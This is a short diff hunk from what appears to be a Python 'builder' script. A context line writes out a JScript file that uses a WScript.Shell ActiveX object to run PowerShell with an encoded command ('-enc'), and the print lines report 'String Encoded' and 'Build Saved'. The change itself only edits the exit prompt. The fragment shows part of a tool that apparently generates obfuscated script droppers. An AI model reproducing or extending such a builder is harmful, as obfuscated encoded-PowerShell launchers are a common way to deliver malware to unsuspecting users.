@@ -17,4 +17,5 @@ file.write("var run=new ActiveXObject('WSCRIPT.Shell').Run('PowerShell -enc " + 
 file.close()
 print('[+] String Encoded.')
 print('[+] Build Saved.')
-raw_input('')
+print('')
+raw_input('PRESS ANY KEY TO CONTINIUE')
